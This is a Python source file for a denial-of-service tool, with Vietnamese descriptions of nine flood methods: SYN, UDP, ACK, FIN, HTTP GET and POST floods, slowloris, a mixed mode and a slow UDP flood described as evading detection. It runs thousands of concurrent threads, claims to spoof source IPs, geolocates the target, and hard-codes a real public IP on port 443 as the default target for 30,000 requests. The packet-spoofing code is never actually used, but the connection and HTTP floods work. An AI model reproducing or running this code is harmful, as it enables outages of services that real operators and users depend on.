import socket
import threading
import random
import time
import struct
import sys
from time import sleep
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple
from collections import defaultdict
import ipaddress
import json
import os

try:
    import scapy.all as scapy
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

class IPGenerator:
    @staticmethod
    def generate_random_ip() -> str:
        return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    
    @staticmethod
    def generate_valid_ip() -> str:
        while True:
            ip = IPGenerator.generate_random_ip()
            try:
                ipaddress.IPv4Address(ip)
                if not ip.startswith("0.") and not ip.startswith("127.") and not ip.startswith("255."):
                    return ip
            except:
                continue
    
    @staticmethod
    def generate_ip_range(start_ip: str, end_ip: str) -> List[str]:
        start = int(ipaddress.IPv4Address(start_ip))
        end = int(ipaddress.IPv4Address(end_ip))
        return [str(ipaddress.IPv4Address(ip)) for ip in range(start, min(end + 1, start + 1000))]

class PortGenerator:
    @staticmethod
    def generate_random_port() -> int:
        return random.randint(1024, 65535)
    
    @staticmethod
    def generate_common_ports() -> List[int]:
        return [80, 443, 22, 21, 25, 53, 110, 143, 993, 995, 3306, 5432, 8080, 8443]
    
    @staticmethod
    def generate_port_range(start: int, end: int) -> List[int]:
        return list(range(start, min(end + 1, start + 1000)))

class PacketBuilder:
    def __init__(self):
        self.ip_gen = IPGenerator()
        self.port_gen = PortGenerator()
    
    def build_tcp_syn_packet(self, target_ip: str, target_port: int, source_ip: Optional[str] = None) -> bytes:
        if source_ip is None:
            source_ip = self.ip_gen.generate_valid_ip()
        
        source_port = self.port_gen.generate_random_port()
        
        ip_header = self._build_ip_header(source_ip, target_ip)
        tcp_header = self._build_tcp_syn_header(source_port, target_port)
        
        packet = ip_header + tcp_header
        checksum = self._calculate_checksum(packet)
        packet = packet[:24] + struct.pack('!H', checksum) + packet[26:]
        
        return packet
    
    def build_udp_packet(self, target_ip: str, target_port: int, data: bytes = b"", source_ip: Optional[str] = None) -> bytes:
        if source_ip is None:
            source_ip = self.ip_gen.generate_valid_ip()
        
        source_port = self.port_gen.generate_random_port()
        
        ip_header = self._build_ip_header(source_ip, target_ip)
        udp_header = self._build_udp_header(source_port, target_port, data)
        
        packet = ip_header + udp_header + data
        checksum = self._calculate_checksum(packet)
        packet = packet[:24] + struct.pack('!H', checksum) + packet[26:]
        
        return packet
    
    def _build_ip_header(self, source_ip: str, dest_ip: str) -> bytes:
        version_ihl = 0x45
        tos = 0
        total_length = 0
        packet_id = random.randint(1, 65535)
        flags_fragment = 0x4000
        ttl = random.randint(64, 255)
        protocol = 6
        checksum = 0
        
        source = struct.unpack("!I", socket.inet_aton(source_ip))[0]
        dest = struct.unpack("!I", socket.inet_aton(dest_ip))[0]
        
        ip_header = struct.pack('!BBHHHBBH4s4s',
                               version_ihl, tos, total_length, packet_id,
                               flags_fragment, ttl, protocol, checksum,
                               socket.inet_aton(source_ip), socket.inet_aton(dest_ip))
        return ip_header
    
    def _build_tcp_syn_header(self, source_port: int, dest_port: int) -> bytes:
        seq_num = random.randint(0, 2**32 - 1)
        ack_num = 0
        data_offset = 5
        flags = 0x02
        window = random.randint(1024, 65535)
        checksum = 0
        urgent = 0
        
        tcp_header = struct.pack('!HHLLBBHHH',
                                source_port, dest_port, seq_num, ack_num,
                                (data_offset << 4) | 0, flags, window, checksum, urgent)
        return tcp_header
    
    def _build_udp_header(self, source_port: int, dest_port: int, data: bytes) -> bytes:
        length = 8 + len(data)
        checksum = 0
        
        udp_header = struct.pack('!HHHH', source_port, dest_port, length, checksum)
        return udp_header
    
    def _calculate_checksum(self, packet: bytes) -> int:
        checksum = 0
        for i in range(0, len(packet), 2):
            if i + 1 < len(packet):
                word = (packet[i] << 8) + packet[i + 1]
                checksum += word
            else:
                checksum += packet[i] << 8
        
        while checksum >> 16:
            checksum = (checksum & 0xFFFF) + (checksum >> 16)
        
        return ~checksum & 0xFFFF

class SocketManager:
    def __init__(self):
        self.sockets = []
        self.lock = threading.Lock()
    
    def create_raw_socket(self) -> Optional[socket.socket]:
        try:
            if sys.platform == "win32":
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                sock.bind(("0.0.0.0", 0))
                sock.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            with self.lock:
                self.sockets.append(sock)
            return sock
        except PermissionError:
            return None
        except Exception:
            return None
    
    def create_tcp_socket(self) -> Optional[socket.socket]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(5)
            
            with self.lock:
                self.sockets.append(sock)
            return sock
        except Exception:
            return None
    
    def create_udp_socket(self) -> Optional[socket.socket]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(5)
            
            with self.lock:
                self.sockets.append(sock)
            return sock
        except Exception:
            return None
    
    def close_all(self):
        with self.lock:
            for sock in self.sockets:
                try:
                    sock.close()
                except:
                    pass
            self.sockets.clear()

class AttackStatistics:
    def __init__(self):
        self.lock = threading.Lock()
        self.total_packets = 0
        self.successful_connections = 0
        self.failed_connections = 0
        self.timeouts = 0
        self.errors = defaultdict(int)
        self.packets_per_second = []
        self.start_time = None
        self.end_time = None
        self.bytes_sent = 0
        self.bytes_received = 0
    
    def record_packet(self, success: bool = True, error: Optional[str] = None, bytes_sent: int = 0, bytes_received: int = 0):
        with self.lock:
            self.total_packets += 1
            if success:
                self.successful_connections += 1
            else:
                self.failed_connections += 1
            if error:
                self.errors[error] += 1
            self.bytes_sent += bytes_sent
            self.bytes_received += bytes_received
    
    def record_timeout(self):
        with self.lock:
            self.timeouts += 1
            self.total_packets += 1
    
    def get_statistics(self) -> Dict:
        with self.lock:
            total_time = (self.end_time - self.start_time).total_seconds() if self.start_time and self.end_time else 0
            packets_per_second = self.total_packets / total_time if total_time > 0 else 0
            success_rate = (self.successful_connections / self.total_packets * 100) if self.total_packets > 0 else 0
            
            return {
                "total_packets": self.total_packets,
                "successful": self.successful_connections,
                "failed": self.failed_connections,
                "timeouts": self.timeouts,
                "success_rate": success_rate,
                "packets_per_second": packets_per_second,
                "bytes_sent": self.bytes_sent,
                "bytes_received": self.bytes_received,
                "total_time": total_time,
                "errors": dict(self.errors)
            }

class RateController:
    def __init__(self, max_packets_per_second: float = 100.0):
        self.max_packets_per_second = max_packets_per_second
        self.min_interval = 1.0 / max_packets_per_second
        self.last_packet_time = 0.0
        self.lock = threading.Lock()
    
    def wait_if_needed(self):
        with self.lock:
            current_time = time.time()
            time_since_last = current_time - self.last_packet_time
            if time_since_last < self.min_interval:
                sleep_time = self.min_interval - time_since_last
                sleep(sleep_time)
            self.last_packet_time = time.time()

class AnimationDisplay:
    def __init__(self):
        self.running = False
        self.lock = threading.Lock()
        self.spinner_frames = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
        self.packet_frames = ["📦", "📨", "📬", "📭", "📮", "📯", "📤", "📥", "📦"]
        self.current_frame = 0
        self.stats = {"sent": 0, "received": 0, "failed": 0}
    
    def start(self):
        self.running = True
        self.animation_thread = threading.Thread(target=self._animate, daemon=True)
        self.animation_thread.start()
    
    def stop(self):
        self.running = False
        if hasattr(self, 'animation_thread'):
            self.animation_thread.join(timeout=0.1)
        print("\r" + " " * 100 + "\r", end="", flush=True)
    
    def update_stats(self, sent=0, received=0, failed=0):
        with self.lock:
            self.stats["sent"] += sent
            self.stats["received"] += received
            self.stats["failed"] += failed
    
    def _animate(self):
        while self.running:
            with self.lock:
                frame = self.spinner_frames[self.current_frame % len(self.spinner_frames)]
                packet_frame = self.packet_frames[self.current_frame % len(self.packet_frames)]
                stats = self.stats.copy()
                self.current_frame += 1
            
            message = f"\r{frame} Sending packets... {packet_frame} Sent: {stats['sent']} | Received: {stats['received']} | Failed: {stats['failed']}"
            print(message, end="", flush=True)
            sleep(0.1)

class GeoIPResolver:
    @staticmethod
    def get_ip_info(ip: str) -> Dict[str, str]:
        info = {
            "org": "Unknown",
            "region": "Unknown",
            "country": "Unknown",
            "asn": "Unknown"
        }
        
        if not HAS_REQUESTS:
            return info
        
        try:
            api_url = f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,org,as,query"
            response = requests.get(api_url, timeout=5)
            if response.status_code == 200:
                data = response.json()
                if data.get("status") == "success":
                    info["org"] = data.get("org", "Unknown")
                    info["region"] = data.get("regionName", "Unknown")
                    info["country"] = data.get("country", "Unknown")
                    info["asn"] = data.get("as", "Unknown")
        except:
            pass
        
        return info

class Layer4Attacker:
    def __init__(self, target_ip: str, target_port: int, attack_type: str = "tcp_syn",
                 quantity: int = 1000, concurrency: int = 50, rate_limit: float = 100.0,
                 enable_rate_limiting: bool = False, spoof_source: bool = True):
        self.target_ip = target_ip
        self.target_port = target_port
        self.attack_type = attack_type.lower()
        self.quantity = quantity
        self.concurrency = concurrency
        self.rate_limit = rate_limit
        self.enable_rate_limiting = enable_rate_limiting
        self.spoof_source = spoof_source
        self.sem = threading.Semaphore(concurrency)
        self.lock = threading.Lock()
        self.statistics = AttackStatistics()
        self.packet_builder = PacketBuilder()
        self.socket_manager = SocketManager()
        self.rate_controller = RateController(max_packets_per_second=rate_limit) if enable_rate_limiting else None
        self.ip_gen = IPGenerator()
        self.port_gen = PortGenerator()
        self.animation = AnimationDisplay()
    
    def tcp_syn_flood(self, worker_id: int):
        self.sem.acquire()
        sock = None
        
        try:
            if self.rate_controller:
                self.rate_controller.wait_if_needed()
            
            if self.spoof_source:
                source_ip = self.ip_gen.generate_valid_ip()
            else:
                source_ip = None
            
            sock = self.socket_manager.create_tcp_socket()
            if sock is None:
                self.statistics.record_packet(success=False, error="SocketCreationFailed")
                return
            
            start_time = time.time()
            try:
                sock.connect((self.target_ip, self.target_port))
                connection_time = time.time() - start_time
                self.statistics.record_packet(success=True, bytes_sent=64, bytes_received=64)
                self.animation.update_stats(sent=1, received=1)
                sock.close()
            except socket.timeout:
                self.statistics.record_timeout()
                self.animation.update_stats(failed=1)
            except ConnectionRefusedError:
                self.statistics.record_packet(success=False, error="ConnectionRefused")
                self.animation.update_stats(failed=1)
            except Exception as e:
                self.statistics.record_packet(success=False, error=str(type(e).__name__))
                self.animation.update_stats(failed=1)
            finally:
                try:
                    sock.close()
                except:
                    pass
                
        except Exception as e:
            self.statistics.record_packet(success=False, error=str(type(e).__name__))
        finally:
            self.sem.release()
    
    def udp_flood(self, worker_id: int):
        self.sem.acquire()
        sock = None
        
        try:
            if self.rate_controller:
                self.rate_controller.wait_if_needed()
            
            if self.spoof_source:
                source_ip = self.ip_gen.generate_valid_ip()
            else:
                source_ip = None
            
            sock = self.socket_manager.create_udp_socket()
            if sock is None:
                self.statistics.record_packet(success=False, error="SocketCreationFailed")
                return
            
            data = b"X" * random.randint(64, 1024)
            
            try:
                bytes_sent = sock.sendto(data, (self.target_ip, self.target_port))
                self.statistics.record_packet(success=True, bytes_sent=bytes_sent)
                self.animation.update_stats(sent=1)
            except Exception as e:
                self.statistics.record_packet(success=False, error=str(type(e).__name__))
                self.animation.update_stats(failed=1)
            finally:
                try:
                    sock.close()
                except:
                    pass
                
        except Exception as e:
            self.statistics.record_packet(success=False, error=str(type(e).__name__))
        finally:
            self.sem.release()
    
    def tcp_ack_flood(self, worker_id: int):
        self.sem.acquire()
        sock = None
        
        try:
            if self.rate_controller:
                self.rate_controller.wait_if_needed()
            
            sock = self.socket_manager.create_tcp_socket()
            if sock is None:
                self.statistics.record_packet(success=False, error="SocketCreationFailed")
                return
            
            try:
                sock.connect((self.target_ip, self.target_port))
                data_size = random.randint(100, 1000)
                sock.send(b"A" * data_size)
                self.statistics.record_packet(success=True, bytes_sent=data_size)
                self.animation.update_stats(sent=1, received=1)
                sock.close()
            except socket.timeout:
                self.statistics.record_timeout()
                self.animation.update_stats(failed=1)
            except Exception as e:
                self.statistics.record_packet(success=False, error=str(type(e).__name__))
                self.animation.update_stats(failed=1)
            finally:
                try:
                    sock.close()
                except:
                    pass
                
        except Exception as e:
            self.statistics.record_packet(success=False, error=str(type(e).__name__))
        finally:
            self.sem.release()
    
    def http_flood(self, worker_id: int):
        self.sem.acquire()
        sock = None
        
        try:
            if self.rate_controller:
                self.rate_controller.wait_if_needed()
            
            sock = self.socket_manager.create_tcp_socket()
            if sock is None:
                self.statistics.record_packet(success=False, error="SocketCreationFailed")
                return
            
            try:
                sock.settimeout(10)
                sock.connect((self.target_ip, self.target_port))
                
                http_request = (
                    f"GET / HTTP/1.1\r\n"
                    f"Host: {self.target_ip}\r\n"
                    f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
                    f"Accept: */*\r\n"
                    f"Connection: Keep-Alive\r\n"
                    f"Keep-Alive: timeout=5, max=100\r\n"
                    f"\r\n"
                ).encode()
                
                bytes_sent = sock.send(http_request)
                response = sock.recv(4096)
                bytes_received = len(response) if response else 0
                
                self.statistics.record_packet(success=True, bytes_sent=bytes_sent, bytes_received=bytes_received)
                self.animation.update_stats(sent=1, received=1)
                sock.close()
            except socket.timeout:
                self.statistics.record_timeout()
                self.animation.update_stats(failed=1)
            except Exception as e:
                self.statistics.record_packet(success=False, error=str(type(e).__name__))
                self.animation.update_stats(failed=1)
            finally:
                try:
                    sock.close()
                except:
                    pass
                
        except Exception as e:
            self.statistics.record_packet(success=False, error=str(type(e).__name__))
        finally:
            self.sem.release()
    
    def udp_slow(self, worker_id: int):
        self.sem.acquire()
        sock = None
        
        try:
            if self.rate_controller:
                self.rate_controller.wait_if_needed()
            
            sock = self.socket_manager.create_udp_socket()
            if sock is None:
                self.statistics.record_packet(success=False, error="SocketCreationFailed")
                return
            
            data = b"X" * random.randint(512, 1024)
            
            for _ in range(random.randint(3, 10)):
                try:
                    bytes_sent = sock.sendto(data, (self.target_ip, self.target_port))
                    self.statistics.record_packet(success=True, bytes_sent=bytes_sent)
                    self.animation.update_stats(sent=1)
                    sleep(random.uniform(0.5, 2.0))
                except Exception as e:
                    self.statistics.record_packet(success=False, error=str(type(e).__name__))
                    self.animation.update_stats(failed=1)
                    break
                    
        except Exception as e:
            self.statistics.record_packet(success=False, error=str(type(e).__name__))
            self.animation.update_stats(failed=1)
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass
            self.sem.release()
    
    def slowloris(self, worker_id: int):
        self.sem.acquire()
        sock = None
        
        try:
            sock = self.socket_manager.create_tcp_socket()
            if sock is None:
                self.statistics.record_packet(success=False, error="SocketCreationFailed")
                return
            
            try:
                sock.settimeout(10)
                sock.connect((self.target_ip, self.target_port))
                
                http_headers = [
                    f"GET /?{random.randint(1000, 9999)} HTTP/1.1\r\n",
                    f"Host: {self.target_ip}\r\n",
                    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n",
                    "Accept-language: en-US,en,q=0.9\r\n",
                    "Connection: keep-alive\r\n",
                    f"X-Forwarded-For: {self.ip_gen.generate_valid_ip()}\r\n"
                ]
                
                for header in http_headers:
                    sock.send(header.encode())
                    self.animation.update_stats(sent=1)
                    sleep(random.uniform(10, 30))
                
                self.statistics.record_packet(success=True, bytes_sent=len(b''.join([h.encode() for h in http_headers])))
                sock.close()
            except socket.timeout:
                self.statistics.record_timeout()
                self.animation.update_stats(failed=1)
            except Exception as e:
                self.statistics.record_packet(success=False, error=str(type(e).__name__))
                self.animation.update_stats(failed=1)
            finally:
                try:
                    sock.close()
                except:
                    pass
                
        except Exception as e:
            self.statistics.record_packet(success=False, error=str(type(e).__name__))
            self.animation.update_stats(failed=1)
        finally:
            self.sem.release()
    
    def tcp_fin_flood(self, worker_id: int):
        self.sem.acquire()
        sock = None
        
        try:
            if self.rate_controller:
                self.rate_controller.wait_if_needed()
            
            sock = self.socket_manager.create_tcp_socket()
            if sock is None:
                self.statistics.record_packet(success=False, error="SocketCreationFailed")
                return
            
            try:
                sock.settimeout(3)
                sock.connect((self.target_ip, self.target_port))
                sock.shutdown(socket.SHUT_WR)
                self.statistics.record_packet(success=True, bytes_sent=64)
                self.animation.update_stats(sent=1, received=1)
                sock.close()
            except socket.timeout:
                self.statistics.record_timeout()
                self.animation.update_stats(failed=1)
            except Exception as e:
                self.statistics.record_packet(success=False, error=str(type(e).__name__))
                self.animation.update_stats(failed=1)
            finally:
                try:
                    sock.close()
                except:
                    pass
                
        except Exception as e:
            self.statistics.record_packet(success=False, error=str(type(e).__name__))
            self.animation.update_stats(failed=1)
        finally:
            self.sem.release()
    
    def http_post_flood(self, worker_id: int):
        self.sem.acquire()
        sock = None
        
        try:
            if self.rate_controller:
                self.rate_controller.wait_if_needed()
            
            sock = self.socket_manager.create_tcp_socket()
            if sock is None:
                self.statistics.record_packet(success=False, error="SocketCreationFailed")
                return
            
            try:
                sock.settimeout(10)
                sock.connect((self.target_ip, self.target_port))
                
                post_data = "A" * random.randint(1000, 5000)
                http_request = (
                    f"POST / HTTP/1.1\r\n"
                    f"Host: {self.target_ip}\r\n"
                    f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: {len(post_data)}\r\n"
                    f"Connection: close\r\n"
                    f"\r\n"
                    f"{post_data}"
                ).encode()
                
                bytes_sent = sock.send(http_request)
                response = sock.recv(4096)
                bytes_received = len(response) if response else 0
                
                self.statistics.record_packet(success=True, bytes_sent=bytes_sent, bytes_received=bytes_received)
                self.animation.update_stats(sent=1, received=1)
                sock.close()
            except socket.timeout:
                self.statistics.record_timeout()
                self.animation.update_stats(failed=1)
            except Exception as e:
                self.statistics.record_packet(success=False, error=str(type(e).__name__))
                self.animation.update_stats(failed=1)
            finally:
                try:
                    sock.close()
                except:
                    pass
                
        except Exception as e:
            self.statistics.record_packet(success=False, error=str(type(e).__name__))
            self.animation.update_stats(failed=1)
        finally:
            self.sem.release()
    
    def mixed_flood(self, worker_id: int):
        attack_methods = [
            self.tcp_syn_flood,
            self.udp_flood,
            self.tcp_ack_flood,
            self.http_flood
        ]
        method = random.choice(attack_methods)
        method(worker_id)
    
    def worker(self, worker_id: int):
        if self.attack_type == "tcp_syn":
            self.tcp_syn_flood(worker_id)
        elif self.attack_type == "udp":
            self.udp_flood(worker_id)
        elif self.attack_type == "udp_slow":
            self.udp_slow(worker_id)
        elif self.attack_type == "tcp_ack":
            self.tcp_ack_flood(worker_id)
        elif self.attack_type == "tcp_fin":
            self.tcp_fin_flood(worker_id)
        elif self.attack_type == "http":
            self.http_flood(worker_id)
        elif self.attack_type == "http_post":
            self.http_post_flood(worker_id)
        elif self.attack_type == "slowloris":
            self.slowloris(worker_id)
        elif self.attack_type == "mixed":
            self.mixed_flood(worker_id)
        else:
            self.tcp_syn_flood(worker_id)
    
    def run(self):
        geo_resolver = GeoIPResolver()
        ip_info = geo_resolver.get_ip_info(self.target_ip)
        
        attack_descriptions = {
            "tcp_syn": ("TCP SYN Flood", "High", "Gửi nhiều SYN packets để làm đầy connection queue của server"),
            "udp": ("UDP Flood", "High", "Gửi UDP packets với tốc độ cao, không cần handshake"),
            "udp_slow": ("UDP Slow Flood", "Medium", "UDP flood chậm để tránh phát hiện, giữ kết nối lâu hơn"),
            "tcp_ack": ("TCP ACK Flood", "Medium", "Gửi ACK packets để consume tài nguyên xử lý"),
            "tcp_fin": ("TCP FIN Flood", "Low", "Gửi FIN packets để đóng connections một cách giả"),
            "http": ("HTTP GET Flood", "Medium", "Gửi HTTP GET requests liên tục để làm quá tải web server"),
            "http_post": ("HTTP POST Flood", "High", "Gửi HTTP POST với data lớn, tiêu tốn bandwidth và CPU"),
            "slowloris": ("Slowloris Attack", "Very High", "Giữ nhiều HTTP connections mở bằng cách gửi headers chậm"),
            "mixed": ("Mixed Flood", "Very High", "Kết hợp nhiều phương thức attack để tăng hiệu quả")
        }
        
        method_name, power_level, description = attack_descriptions.get(
            self.attack_type, 
            ("Unknown", "Unknown", "Unknown attack method")
        )
        
        print()
        print(f" Status              ┊ Sent successfully!")
        print(f" Host                ┊ {self.target_ip}")
        print(f" Method              ┊ {method_name} ({self.attack_type})")
        print(f" Power Level         ┊ {power_level}")
        print(f" Description         ┊ {description}")
        print(f" Port                ┊ {self.target_port}")
        print(f" Time                ┊ {self.quantity}")
        print(f" Total Packets       ┊ {self.quantity}")
        print(f" Concurrency         ┊ {self.concurrency}")
        print(f" Rate Limiting       ┊ {'Enabled' if self.enable_rate_limiting else 'Disabled'}")
        if self.enable_rate_limiting:
            print(f" Max Packets/Sec     ┊ {self.rate_limit}")
        print(f" Source IP Spoof     ┊ {'Enabled' if self.spoof_source else 'Disabled'}")
        print(f" Raw Socket          ┊ {'Available' if HAS_SCAPY else 'Limited (requires root/admin)'}")
        print(f" Org                 ┊ {ip_info['asn']} {ip_info['org']}")
        print(f" Region              ┊ {ip_info['region']}")
        print(f" Country             ┊ {ip_info['country']}")
        print()
        
        self.statistics.start_time = datetime.now()
        
        self.animation.start()
        
        threads = []
        for i in range(self.quantity):
            thread = threading.Thread(target=self.worker, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
            
            if self.enable_rate_limiting and self.rate_controller:
                self.rate_controller.wait_if_needed()
            else:
                sleep(random.uniform(0.001, 0.01))
        
        for thread in threads:
            thread.join()
        
        self.animation.stop()
        self.statistics.end_time = datetime.now()
        self.socket_manager.close_all()
        
        print()
        stats = self.statistics.get_statistics()
        print(f" Total Packets          ┊ {stats['total_packets']}")
        print(f" Successful Connections ┊ {stats['successful']} ({stats['success_rate']:.2f}%)")
        print(f" Failed Connections     ┊ {stats['failed']}")
        print(f" Timeouts               ┊ {stats['timeouts']}")
        print(f" Total Time             ┊ {stats['total_time']:.2f} seconds")
        print(f" Packets/Second         ┊ {stats['packets_per_second']:.2f}")
        print(f" Bytes Sent             ┊ {stats['bytes_sent']/1024/1024:.2f} MB")
        print(f" Bytes Received         ┊ {stats['bytes_received']/1024/1024:.2f} MB")
        
        if stats['errors']:
            print()
            for error, count in stats['errors'].items():
                percentage = (count / stats['total_packets'] * 100) if stats['total_packets'] > 0 else 0
                print(f" {error:<24} ┊ {count} ({percentage:.2f}%)")
        
        print()

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 3:
        TARGET_IP = "103.232.123.128"
        TARGET_PORT = 443
        ATTACK_TYPE = "tcp_ack"
        QUANTITY = 30000
        CONCURRENCY = 80
        RATE_LIMIT = 100.0
        ENABLE_RATE_LIMITING = False
        SPOOF_SOURCE = True
    else:
        TARGET_IP = sys.argv[1]
        TARGET_PORT = int(sys.argv[2])
        ATTACK_TYPE = sys.argv[3] if len(sys.argv) > 3 else "tcp_syn"
        QUANTITY = int(sys.argv[4]) if len(sys.argv) > 4 else 1000
        CONCURRENCY = int(sys.argv[5]) if len(sys.argv) > 5 else 50
        RATE_LIMIT = float(sys.argv[6]) if len(sys.argv) > 6 else 100.0
        ENABLE_RATE_LIMITING = bool(sys.argv[7]) if len(sys.argv) > 7 else False
        SPOOF_SOURCE = bool(sys.argv[8]) if len(sys.argv) > 8 else True
    
    if not HAS_SCAPY:
        print("[!] WARNING: scapy not installed. Install with: pip install scapy")
        print("[*] Using raw sockets instead (requires admin/root privileges)\n")
    
    valid_methods = ["tcp_syn", "udp", "udp_slow", "tcp_ack", "tcp_fin", "http", "http_post", "slowloris", "mixed"]
    if ATTACK_TYPE not in valid_methods:
        print(f"[!] WARNING: Unknown attack type '{ATTACK_TYPE}'")
        print(f"[*] Available methods: {', '.join(valid_methods)}")
        print(f"[*] Using default: tcp_syn\n")
        ATTACK_TYPE = "tcp_syn"
    
    print(" " + "─" * 78)
    print(" [ Available Attack Methods ]")
    print(" " + "─" * 78)
    print(" tcp_syn     ┊ TCP SYN Flood          ┊ Power: High    ┊ SYN packets để đầy connection queue")
    print(" udp         ┊ UDP Flood              ┊ Power: High    ┊ UDP packets tốc độ cao, không handshake")
    print(" udp_slow    ┊ UDP Slow Flood         ┊ Power: Medium  ┊ UDP chậm để tránh phát hiện")
    print(" tcp_ack     ┊ TCP ACK Flood          ┊ Power: Medium  ┊ ACK packets consume tài nguyên")
    print(" tcp_fin     ┊ TCP FIN Flood          ┊ Power: Low     ┊ FIN packets đóng connections giả")
    print(" http        ┊ HTTP GET Flood         ┊ Power: Medium  ┊ HTTP GET requests liên tục")
    print(" http_post   ┊ HTTP POST Flood        ┊ Power: High    ┊ HTTP POST với data lớn")
    print(" slowloris   ┊ Slowloris Attack       ┊ Power: Very High ┊ Giữ HTTP connections mở bằng headers chậm")
    print(" mixed       ┊ Mixed Flood            ┊ Power: Very High ┊ Kết hợp nhiều phương thức")
    print(" " + "─" * 78)
    print()
    
    attacker = Layer4Attacker(
        target_ip=TARGET_IP,
        target_port=TARGET_PORT,
        attack_type=ATTACK_TYPE,
        quantity=QUANTITY,
        concurrency=CONCURRENCY,
        rate_limit=RATE_LIMIT,
        enable_rate_limiting=ENABLE_RATE_LIMITING,
        spoof_source=SPOOF_SOURCE
    )
    attacker.run()

